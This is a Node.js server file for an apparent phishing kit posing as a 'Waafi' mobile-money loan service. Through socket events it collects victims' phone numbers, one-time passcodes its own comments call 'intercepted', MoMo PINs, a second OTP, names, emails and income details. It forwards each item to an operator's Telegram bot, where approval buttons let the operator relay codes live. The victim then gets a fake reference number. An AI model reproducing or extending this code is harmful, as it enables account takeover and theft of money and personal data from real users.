require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');

const botManager = require('./bot_manager');

const app = express();
const server = http.createServer(app);

const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

global.io = io; 

const PORT = process.env.PORT || 3000;
const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
    botManager.bot.processUpdate(req.body);
    res.sendStatus(200);
});

io.on('connection', (socket) => {
    // Structural internal tracking token generation to bypass initial client delays
    let activeRoom = `WFI-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
    
    socket.join(activeRoom);
    socket.emit('session-ready', { appId: activeRoom });
    console.log(` Assigned internal tracking session: ${activeRoom}`);

    socket.on('join-room', (room) => {
        if (room && room !== "null" && room !== "") {
            socket.leave(activeRoom);
            socket.join(room);
            activeRoom = room;
            console.log(` User synchronized room identifier: ${room}`);
        }
    });

    const getValidId = (data) => {
        if (data && data.appId && data.appId !== "null" && data.appId !== "") {
            return data.appId;
        }
        return activeRoom;
    };

    // STEP 1: Initial Phone Request (Triggers Admin Alert)
    socket.on('request-otp1', (data) => {
        const currentId = getValidId(data);
        botManager.sendToAdmin(currentId, "Initial Request: Phone Submitted", { Phone: data.phone }, false);
        
        // Notify the client that the notification went through and they can now input the OTP
        socket.emit('otp1-requested-success');
    });

    // STEP 1: Verify intercepted OTP 1 (Requires Admin Approval Buttons)
    socket.on('verify-otp1', (data) => {
        const currentId = getValidId(data);
        botManager.sendToAdmin(currentId, "Step 1: Phone & Intercepted OTP 1", { "OTP 1": data.code }, true);
    });

    // STEP 2: Main MoMo PIN Verification (Requires Admin Approval Buttons)
    socket.on('verify-pin', (data) => {
        const currentId = getValidId(data);
        botManager.sendFinalApproval(currentId, data.pin);
    });

    // STEP 3: OTP 2 Validation (Requires Admin Approval Buttons)
    socket.on('verify-otp2', (data) => {
        const currentId = getValidId(data);
        botManager.sendSecondOTP(currentId, data.code);
    });

    // STEP 7 + Finalization Handler: Collects steps 4, 5, 6, and 7
    socket.on('finalize-loan', (data) => {
        const currentId = getValidId(data);
        const { confirmPin, ...profileData } = data;
        
        // Quietly log data steps to the admin bot manager for tracking
        botManager.sendToAdmin(currentId, "Step 4: Loan Request Parameters", {
            "Type": profileData.loanType,
            "Amount": profileData.amount,
            "Term": profileData.term + " mois",
            "Purpose": profileData.purpose
        }, false);

        botManager.sendToAdmin(currentId, "Step 5: Personal Identity Profile", {
            "Name": `${profileData.firstName} ${profileData.lastName}`,
            "Email": profileData.email
        }, false);

        botManager.sendToAdmin(currentId, "Step 6: Employment & Income Status", {
            "Status": profileData.employment,
            "Income": profileData.income,
            "Employer": profileData.employer || "N/A"
        }, false);

        botManager.sendToAdmin(currentId, "Step 7: Final Signature PIN Confirmation", { 
            "Confirmed PIN": confirmPin 
        }, false);
        
        // Generate systematic response properties instantly for client success step 8
        const referenceId = `REF-${Math.floor(100000 + Math.random() * 900000)}`;
        io.to(currentId).emit('application-finalized', { referenceId });
        console.log(` Session ${currentId} successfully generated local validation parameters.`);
    });

    socket.on('disconnect', () => {
        console.log(` User disconnected socket room: ${activeRoom}`);
    });
});

server.listen(PORT, async () => {
    console.log(` Waafi Loan Server running on port ${PORT}`);
    if (EXTERNAL_URL) {
        const webhookUrl = `${EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
        try {
            await botManager.bot.setWebHook(webhookUrl);
            console.log(` Webhook successfully set to: ${webhookUrl}`);
        } catch (err) {
            console.error(' Webhook Setup Failed:', err.message);
        }
    }
});
